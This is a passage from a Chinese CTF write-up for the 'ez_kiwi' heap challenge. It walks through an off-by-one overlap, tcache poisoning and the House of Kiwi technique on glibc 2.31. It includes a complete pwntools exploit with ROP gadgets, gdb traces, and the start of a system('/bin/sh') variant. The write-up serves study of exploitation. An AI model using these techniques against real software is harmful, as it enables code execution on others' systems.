href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520迎新赛</a></p><h6 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h6><p>这题挺适合拿来调试 kiwi 的，题目给了个简单的 off-by-one ，👴 认为 off-by-one 是非常白给的漏洞所以不会难。</p><p>同时题目没有给显式的 exit 并且每次进入 menu 前会清除几个 hook ，也是要求我们打 IO 了。</p><p>但是出题人这次所有的题目都没有开 sandbox ，这是个大伏笔，暂按下不表。</p><h6 id="思路-v3"><a class="header-anchor" href="#思路-v3">¶</a>思路</h6><ol><li>off-by-one 打堆重叠改 size 拿到大 chunk</li><li>Free 大 chunk 再拿回来，利用残留指针简单的 leak</li><li>利用重叠堆块里的 chunk 构造 Tcache Poisoning 任意写，打 kiwi</li></ol><h6 id="Exp-v3"><a class="header-anchor" href="#Exp-v3">¶</a>Exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br>rax = libc_base + <span class="hljs-number">0x000000000004a550</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000026b72</span><br>rsi = libc_base + <span class="hljs-number">0x0000000000027529</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011c371</span><br>ret = rdi + <span class="hljs-number">1</span><br>syscall = libc_base + <span class="hljs-number">0x0000000000066229</span><br>read = libc.sym.read<br>write = libc.sym.write<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x000000000004a550 : pop rax ; ret</span><br><span class="hljs-string">0x0000000000026b72 : pop rdi ; ret</span><br><span class="hljs-string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x0000000000027529 : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000025679 : ret</span><br><span class="hljs-string">0x0000000000066229: syscall; ret;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># Leak heap</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = (heap_leak&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x2a0</span><br>rop_addr = heap_base + <span class="hljs-number">0x440</span><br><br><span class="hljs-comment"># Prepare ROP</span><br>rop_chain = flat(<br>    <span class="hljs-comment">#   open(&#x27;./flag\0&#x27;)                                                 </span><br>    [rax,<span class="hljs-number">2</span>,rdi,flag_addr,rsi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,syscall] + \<br>    <span class="hljs-comment">#   read(new_fd,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">3</span>,rsi,flag_addr+<span class="hljs-number">0x10</span>,rdx_r12,<span class="hljs-number">0x50</span>,<span class="hljs-number">0</span>,read] + \<br>    <span class="hljs-comment">#   write(1,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">1</span>,write] + [<span class="hljs-string">&#x27;\n&#x27;</span>]<br>)<br>edit(<span class="hljs-number">4</span>,rop_chain)<br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = setcontext + 61</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(magic))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_helper_jumps + 0xA0/0xA8</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(_IO_helper_jumps + <span class="hljs-number">0xA0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,p64(rop_addr) + p64(ret))<br><br><span class="hljs-comment"># Tcache Poisoning3 topchunk -&gt; size </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(heap_base+<span class="hljs-number">0x7a0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>pause()<br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h6 id="调试-v3"><a class="header-anchor" href="#调试-v3">¶</a>调试</h6><p>简单的 off-by-one 就不提了，主要看一下任意写后咋进入的我们 <strong>kiwi</strong> 流程，又是怎么执行的 <strong>ROP</strong>。</p><p>在 gift() 函数下断点，<code>b malloc</code>。</p><p>当其他条件不满足时来到 sysmalloc 准备从 topchunk 中分配，但由于 topchunk 已经被 👴 🐑 完了，所以会进入 <code>__malloc_assert</code>。</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526164931591.png" alt="image-20220526164931591" style="zoom:67%;" /><p>然后我们的主角 <strong>fflush</strong> 就登场了，这里的 <strong>__fxprintf</strong> 也要眼熟一下( <strong>husk</strong> 会考)：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526170141182.png" alt="image-20220526170141182" style="zoom:67%;" /><p>这里是重点，我们必须结合汇编代码才能玩明白点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/40i &amp;fflush<br>   0x7ffff7e5a4c0 &lt;fflush&gt;:     endbr64<br>   0x7ffff7e5a4c4 &lt;fflush+4&gt;:   test   rdi,rdi<br>   0x7ffff7e5a4c7 &lt;fflush+7&gt;:   je     0x7ffff7e5a590 &lt;fflush+208&gt;<br>   0x7ffff7e5a4cd &lt;fflush+13&gt;:  push   rbp<br>   0x7ffff7e5a4ce &lt;fflush+14&gt;:  push   rbx<br>   0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi<br>   0x7ffff7e5a4d2 &lt;fflush+18&gt;:  sub    rsp,0x8<br>   0x7ffff7e5a4d6 &lt;fflush+22&gt;:  mov    edx,DWORD PTR [rdi]<br>   0x7ffff7e5a4d8 &lt;fflush+24&gt;:  and    edx,0x8000<br>   0x7ffff7e5a4de &lt;fflush+30&gt;:  jne    0x7ffff7e5a51d &lt;fflush+93&gt;<br>   0x7ffff7e5a4e0 &lt;fflush+32&gt;:  mov    rdi,QWORD PTR [rdi+0x88]<br>   0x7ffff7e5a4e7 &lt;fflush+39&gt;:  mov    rbp,QWORD PTR fs:0x10<br>   0x7ffff7e5a4f0 &lt;fflush+48&gt;:  cmp    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a4f4 &lt;fflush+52&gt;:  je     0x7ffff7e5a519 &lt;fflush+89&gt;<br>   0x7ffff7e5a4f6 &lt;fflush+54&gt;:  mov    eax,DWORD PTR fs:0x18<br>   0x7ffff7e5a4fe &lt;fflush+62&gt;:  test   eax,eax<br>   0x7ffff7e5a500 &lt;fflush+64&gt;:  jne    0x7ffff7e5a5a0 &lt;fflush+224&gt;<br>   0x7ffff7e5a506 &lt;fflush+70&gt;:  mov    edx,0x1<br>   0x7ffff7e5a50b &lt;fflush+75&gt;:  cmpxchg DWORD PTR [rdi],edx<br>   0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88]<br>   0x7ffff7e5a515 &lt;fflush+85&gt;:  mov    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a519 &lt;fflush+89&gt;:  add    DWORD PTR [rdi+0x4],0x1<br>   0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8]<br>   0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>   0x7ffff7e5a52b &lt;fflush+107&gt;: lea    rax,[rip+0x1680d6]        # 0x7ffff7fc2608 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;<br>   0x7ffff7e5a532 &lt;fflush+114&gt;: sub    rax,rdx<br>   0x7ffff7e5a535 &lt;fflush+117&gt;: mov    rsi,rbp<br>   0x7ffff7e5a538 &lt;fflush+120&gt;: sub    rsi,rdx<br>   0x7ffff7e5a53b &lt;fflush+123&gt;: cmp    rax,rsi<br>   0x7ffff7e5a53e &lt;fflush+126&gt;: jbe    0x7ffff7e5a598 &lt;fflush+216&gt;<br>   0x7ffff7e5a540 &lt;fflush+128&gt;: mov    rdi,rbx<br>=&gt; 0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]<br></code></pre></td></tr></table></figure><p>好的，比较关键的几个点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi# rbx = stderr<br>#0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88] rdi = [stderr + 0x88] = _IO_stdfile_2_lock<br><br>0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8] # rbp = [stderr + 0xd8] = _IO_file_jumps<br>0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]# call [_IO_helper_jumps + 0x60] &lt;-&gt; call __sync<br></code></pre></td></tr></table></figure><p>可以发现我们的 <strong>rdx = _IO_helper_jumps</strong>，而高版本的 setcontext 又是由 rdx 控制：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526174433379.png" alt="image-20220526174433379" style="zoom:67%;" /><p>那么我们在 <code>_IO_helper_jumps + 0xA0</code> 布置的 <code>rsp = rop_chain </code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">► <span class="hljs-number">0x7ffff7e2d0dd</span> &lt;setcontext+<span class="hljs-number">61</span>&gt;     mov    rsp, qword ptr [rdx + <span class="hljs-number">0xa0</span>]   &lt;<span class="hljs-number">0x7ffff7fc1940</span>&gt;<br></code></pre></td></tr></table></figure><p>在 <code>_IO_helper_jumps + 0xA8</code> 布置的 rcx，也就是被 push 进栈，结束后 ret 取到的 <code>rip = ret</code>：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526175716709.png" alt="image-20220526175716709" style="zoom:67%;" /> <p>再往下走就到了 ROP 链了，不做过多调试展示：</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526180101385.png" alt="image-20220526180101385" style="zoom:67%;" /><p>最后也是成功地执行了我们的链子，orw 出了 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DEBUG] Received 0xdc bytes:<br>    <span class="hljs-string">&quot;ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.\n&quot;</span><br>ez_kiwi: malloc.c:2379: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)<span class="hljs-string">&#x27; failed.</span><br><span class="hljs-string">[DEBUG] Received 0x30 bytes:</span><br><span class="hljs-string">    00000000  63 61 66 66  65 31 6e 65  7b 74 65 73  74 5f 66 6c  │caff│e1ne│&#123;tes│t_fl│</span><br><span class="hljs-string">    00000010  61 67 7e 51  77 51 7e 7e  7e 7d 0a 00  00 00 00 00  │ag~Q│wQ~~│~&#125;··│····│</span><br><span class="hljs-string">    00000020  40 65 e6 f7  ff 7f 00 00  10 d0 55 55  55 55 00 00  │@e··│····│··UU│UU··│</span><br><span class="hljs-string">    00000030</span><br><span class="hljs-string">caffe1ne&#123;test_flag~QwQ~~~&#125;</span><br><span class="hljs-string">\x00\x00\x00e\x7f\x00\x10UUUU\x00</span><br></code></pre></td></tr></table></figure><h6 id="没沙箱的简单情形"><a class="header-anchor" href="#没沙箱的简单情形">¶</a>没沙箱的简单情形</h6><p>主要是搞清楚这个利用路线，明白啥时候 🐑 指定的函数指针。</p><p>因为比赛时题目没开沙箱，而且是 <strong>2.31</strong> 版本的 libc，下面是把 <strong>__sync</strong> 直接换成 <code>system</code> 函数，在 stderr 写 <code>/bin/sh\0</code> 的更简单情形。</p><p>这里走 kiwi 🐑 的是 <strong>main_arena -&gt; top</strong> ，就<strong>不需要 leak 堆地址</strong>了。当然 leak 堆地址可以后去劫持 <strong>Tcache Struct</strong> 然后瞎几把 🐑 但是 👴 最近几天玩 Tcache 玩累了就没打了。但如果是 <strong>2.32</strong> 以上版本，由于<a href="https://caffeine.darkflow.top/posts/d6d32804.html">指针异或机制</a>，还是必须要 leak。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 